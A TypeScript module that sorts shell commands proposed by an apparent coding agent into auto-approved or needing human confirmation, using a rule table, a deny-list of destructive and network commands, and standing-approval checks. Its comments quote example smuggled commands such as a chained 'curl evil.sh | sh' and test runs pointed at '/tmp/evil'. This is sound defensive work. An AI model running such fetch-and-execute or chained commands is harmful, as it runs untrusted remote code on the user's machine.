export type Decision = "allow" | "confirm";
export type Severity = "caution" | "dangerous";

export interface Classification {
  decision: Decision;
  reason: string;
  severity?: Severity;
}

type ArgPattern = string | "*" | { anyOf: string[] };

interface CommandRule {
  program: string;
  args?: ArgPattern[];
  decision: Decision;
  severity?: Severity;
  reason: string;
}

// Ordered rule table, checked in order per-program: first match wins. These
// exist to attach precise reasons/severity to cases the flat heuristics below
// only classify coarsely (e.g. "git push" vs "git push --force" are both just
// "never auto-approve" today, with no distinction in *why*). A rule only
// needs to be added here when it either changes the decision or adds
// meaningful reason/severity granularity for the approval UI — anything not
// covered falls through to the heuristics unchanged.
const DEFAULT_RULES: CommandRule[] = [
  { program: "git", args: ["push", "--force"], decision: "confirm", severity: "dangerous", reason: "force-push can overwrite remote history" },
  { program: "git", args: ["push", "-f"], decision: "confirm", severity: "dangerous", reason: "force-push can overwrite remote history" },
  { program: "git", args: ["push", "--force-with-lease"], decision: "confirm", severity: "dangerous", reason: "force-push can overwrite remote history" },
  { program: "git", args: ["push"], decision: "confirm", severity: "caution", reason: "pushes local commits to a remote" },
  { program: "git", args: ["reset", "--hard"], decision: "confirm", severity: "dangerous", reason: "discards uncommitted local changes" },
  { program: "git", args: ["clean", "-fd"], decision: "confirm", severity: "dangerous", reason: "permanently deletes untracked files and directories" },
  { program: "git", args: ["clean", "-f"], decision: "confirm", severity: "dangerous", reason: "permanently deletes untracked files" },
  { program: "rm", args: [{ anyOf: ["-rf", "-fr", "-r", "-f", "-rfv", "-fv"] }], decision: "confirm", severity: "dangerous", reason: "recursive/force delete" },
  { program: "rm", decision: "confirm", severity: "caution", reason: "deletes a file" },
  { program: "sudo", decision: "confirm", severity: "dangerous", reason: "runs as superuser" },
  { program: "curl", decision: "confirm", severity: "caution", reason: "makes a network request" },
  { program: "wget", decision: "confirm", severity: "caution", reason: "makes a network request" },
  { program: "shutdown", decision: "confirm", severity: "dangerous", reason: "shuts down or restarts the machine" },
  { program: "reboot", decision: "confirm", severity: "dangerous", reason: "restarts the machine" },
  { program: "npm", args: ["test"], decision: "allow", reason: "runs the test suite" },
  { program: "npx", args: ["tsc"], decision: "allow", reason: "type-checks only, no side effects" },
  { program: "pytest", decision: "allow", reason: "runs the test suite" },
];

function buildRulesByProgram(rules: CommandRule[]): Map<string, CommandRule[]> {
  const map = new Map<string, CommandRule[]>();
  for (const rule of rules) {
    const list = map.get(rule.program);
    if (list) list.push(rule);
    else map.set(rule.program, [rule]);
  }
  return map;
}

const RULES_BY_PROGRAM = buildRulesByProgram(DEFAULT_RULES);

function matchToken(pattern: ArgPattern, token: string | undefined): boolean {
  if (token === undefined) return false;
  if (pattern === "*") return true;
  if (typeof pattern === "string") return token === pattern;
  return pattern.anyOf.includes(token);
}

function matchesArgs(args: string[], pattern: ArgPattern[] | undefined, exact: boolean): boolean {
  const expected = pattern ?? [];
  if (exact ? args.length !== expected.length : args.length < expected.length) return false;
  return expected.every((p, i) => matchToken(p, args[i]));
}

function classifyByRuleTable(tokens: string[]): Classification | null {
  const rules = RULES_BY_PROGRAM.get(tokens[0]);
  if (!rules) return null;
  const args = tokens.slice(1);
  for (const rule of rules) {
    // "allow" rules must match the command exactly. A trailing argument can
    // point an otherwise-safe program at something outside the workspace
    // ("npm test --prefix /tmp/evil" runs that directory's test script,
    // "pytest /tmp/evil" imports its conftest.py), so anything with extra
    // tokens falls through to the heuristics tier, which still applies the
    // deny-list. "confirm" rules stay prefix matches — they only add
    // reason/severity detail and can never widen what runs unattended.
    if (matchesArgs(args, rule.args, rule.decision === "allow")) {
      return { decision: rule.decision, reason: rule.reason, severity: rule.severity };
    }
  }
  return null;
}

// --- Fallback heuristics (moved here unchanged from the original bash.ts;
// this is the tier consulted when no rule above matches the command).

const READ_ONLY_EXACT = new Set([
  "git status",
  "git diff",
  "git log",
  "node --version",
  "npm ls",
  "python --version",
]);
const READ_ONLY_PREFIX_WORDS = ["ls", "dir", "cat", "type", "grep", "rg", "find"];
const AUTO_APPROVE_PREFIXES = ["npm test", "npx tsc", "pytest"];

// Conservative "does this look like more than one simple command" guard.
// Not a full shell parser — matches any operator that could chain, pipe,
// substitute, or background additional commands onto an allowlisted prefix.
const SHELL_METACHARACTER_RE = /;|&&|\|\||\||`|\$\(|<\(|>\(|>|\n|&/;

export function hasShellMetacharacters(command: string): boolean {
  return SHELL_METACHARACTER_RE.test(command);
}

export function isAutoApproved(command: string): boolean {
  const trimmed = command.trim();
  if (hasShellMetacharacters(trimmed)) return false;
  if (READ_ONLY_EXACT.has(trimmed)) return true;
  const firstWord = trimmed.split(/\s+/)[0];
  if (READ_ONLY_PREFIX_WORDS.includes(firstWord)) return true;
  return AUTO_APPROVE_PREFIXES.some((p) => trimmed === p || trimmed.startsWith(p + " "));
}

const NEVER_AUTO_WORDS = ["rm ", "del ", "git push", "git reset", "curl ", "wget ", "sudo "];

export function isNeverAutoApproved(command: string): boolean {
  const trimmed = command.trim();
  if (
    NEVER_AUTO_WORDS.some((w) => {
      const word = w.trim();
      return trimmed.startsWith(w) || new RegExp(`(^|[^a-zA-Z0-9_])${word}`).test(trimmed);
    })
  )
    return true;
  if (/[>]/.test(trimmed)) return true;
  if (/\bsudo\b/.test(trimmed)) return true;
  if (/(^|\s)\/(?!$)/.test(trimmed) && !trimmed.startsWith("git ")) return true;
  return false;
}

function classifyWithHeuristics(command: string): Classification {
  if (isNeverAutoApproved(command)) {
    return { decision: "confirm", reason: "matches a pattern that always requires approval" };
  }
  if (isAutoApproved(command)) {
    return { decision: "allow", reason: "matches an auto-approved command pattern" };
  }
  return { decision: "confirm", reason: "not on the auto-approved list" };
}

/**
 * The pattern a user may grant standing approval to, or null when this command
 * is not something to hand a blank cheque for.
 *
 * The refusals matter more than the matching. A command carrying shell
 * metacharacters is never offered, because "npm test" would otherwise become a
 * licence for "npm test && curl evil.sh | sh". Anything the deny-list or the
 * rule table already treats as destructive is never offered either, so no
 * sequence of clicks can produce a standing approval for rm, sudo, git push or
 * a redirect — those stay one-by-one decisions forever.
 *
 * The pattern is the program plus a bare subcommand, so approving "npm run
 * build" grants "npm run", not "npm". Anything that is not a plain word (a
 * path, a flag, a filename) is left out rather than guessed at.
 */
export function alwaysAllowPattern(command: string): string | null {
  const trimmed = command.trim();
  if (!trimmed) return null;
  if (hasShellMetacharacters(trimmed)) return null;
  if (isNeverAutoApproved(trimmed)) return null;
  if (classifyCommand(trimmed).severity) return null;

  const tokens = trimmed.split(/\s+/);
  // A program named by path is excluded: the same relative name can mean a
  // different file in a different directory.
  if (!/^[A-Za-z0-9][A-Za-z0-9_.:@+-]*$/.test(tokens[0])) return null;

  const second = tokens[1];
  const isSubcommand = second !== undefined && /^[A-Za-z][A-Za-z0-9:_-]*$/.test(second);
  return isSubcommand ? `${tokens[0]} ${second}` : tokens[0];
}

/**
 * Whether a standing approval covers this command. Every guard from
 * alwaysAllowPattern is re-applied here rather than trusted from when the
 * pattern was stored: the list is user-editable settings data, so a hand-added
 * "rm" or "sudo" entry still grants nothing, and matching is on the derived
 * pattern rather than a string prefix, so "npmfoo" cannot ride in on "npm".
 */
export function matchesAlwaysAllowed(command: string, patterns: readonly string[]): boolean {
  const pattern = alwaysAllowPattern(command);
  return pattern !== null && patterns.includes(pattern);
}

export function classifyCommand(command: string): Classification {
  const trimmed = command.trim();

  if (!hasShellMetacharacters(trimmed)) {
    const ruleMatch = classifyByRuleTable(trimmed.split(/\s+/));
    // The deny-list is a hard veto over the rule table, never a fallback the
    // table can skip past: a rule may add detail to something that already
    // needs approval, but must not auto-approve anything the heuristics tier
    // would have blocked.
    if (ruleMatch && !(ruleMatch.decision === "allow" && isNeverAutoApproved(trimmed))) {
      return ruleMatch;
    }
  }
  return classifyWithHeuristics(trimmed);
}
